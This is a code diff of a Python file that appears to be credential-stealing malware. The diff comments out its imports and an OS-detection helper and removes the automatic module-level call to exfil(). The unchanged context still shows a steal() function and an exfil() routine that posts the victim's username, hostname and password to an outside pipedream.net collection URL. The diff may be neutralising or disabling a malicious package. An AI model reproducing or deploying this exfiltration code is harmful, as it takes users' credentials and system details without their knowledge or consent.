@@ -1,16 +1,16 @@
-import requests,getpass,platform,os,shutil,time
+# import requests,getpass,platform,os,shutil,time
+# exfil()
 
-def get_os():
-    OS = platform.system()
-    if OS.lower() == "linux":
-        return "meow"
-    elif OS.lower() == "windows":
-        return "i_hate_windows"
-    elif OS.lower() == "darwin":
-        return "meow2"
-    else:
-        return False
-
+# def get_os():
+#     OS = platform.system()
+#     if OS.lower() == "linux":
+#         return "meow"
+#     elif OS.lower() == "windows":
+#         return "i_hate_windows"
+#     elif OS.lower() == "darwin":
+#         return "meow2"
+#     else:
+#         return False
 
 def steal():
     try:
@@ -53,6 +53,3 @@ def exfil():
         requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname, "Password": passwd})
     else:
         requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname})
-
-
-exfil()
